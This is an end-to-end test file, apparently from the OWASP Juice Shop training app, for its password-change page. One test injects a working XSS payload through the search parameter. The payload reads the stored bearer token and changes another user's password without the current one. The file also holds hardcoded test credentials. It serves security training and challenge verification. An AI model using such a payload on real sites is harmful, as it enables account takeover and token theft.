/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')

describe('/#/privacy-security/change-password', () => {
  let currentPassword, newPassword, newPasswordRepeat, changeButton

  describe('as Morty', () => {
    protractor.beforeEach.login({ email: 'morty@' + config.get('application.domain'), password: 'focusOnScienceMorty!focusOnScience' })

    beforeEach(() => {
      browser.get(protractor.basePath + '/#/privacy-security/change-password')
      currentPassword = element(by.id('currentPassword'))
      newPassword = element(by.id('newPassword'))
      newPasswordRepeat = element(by.id('newPasswordRepeat'))
      changeButton = element(by.id('changeButton'))
    })

    it('should be able to change password', () => {
      currentPassword.sendKeys('focusOnScienceMorty!focusOnScience')
      newPassword.sendKeys('GonorrheaCantSeeUs!')
      newPasswordRepeat.sendKeys('GonorrheaCantSeeUs!')
      changeButton.click()

      expect($('.confirmation').getAttribute('hidden')).not.toBeTruthy()
    })
  })

  describe('challenge "changePasswordBenderChallenge"', () => {
    protractor.beforeEach.login({ email: 'bender@' + config.get('application.domain'), password: 'OhG0dPlease1nsertLiquor!' })

    it('should be able to change password via XSS-powered attack on password change without passing current password', () => {
      xssdecoded = `<iframe src="javascript:xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET', '`+browser.baseUrl+`/rest/user/change-password?new=slurmCl4ssic&amp;repeat=slurmCl4ssic'); xmlhttp.setRequestHeader('Authorization',\`Bearer=\${localStorage.getItem('token')}\`); xmlhttp.send();">`
      browser.get(protractor.basePath + '/#/search?q=' + encodeURIComponent(xssdecoded))
      browser.driver.sleep(2000)
      browser.get(protractor.basePath + '/#/login')
      element(by.id('email')).sendKeys('bender@' + config.get('application.domain'))
      element(by.id('password')).sendKeys('slurmCl4ssic')
      element(by.id('loginButton')).click()

      expect(browser.getCurrentUrl()).toMatch(/\/search/)
    })

    protractor.expect.challengeSolved({ challenge: 'Change Bender\'s Password', category: 'XSS', wafshouldblock: "Yes" })
  })
})
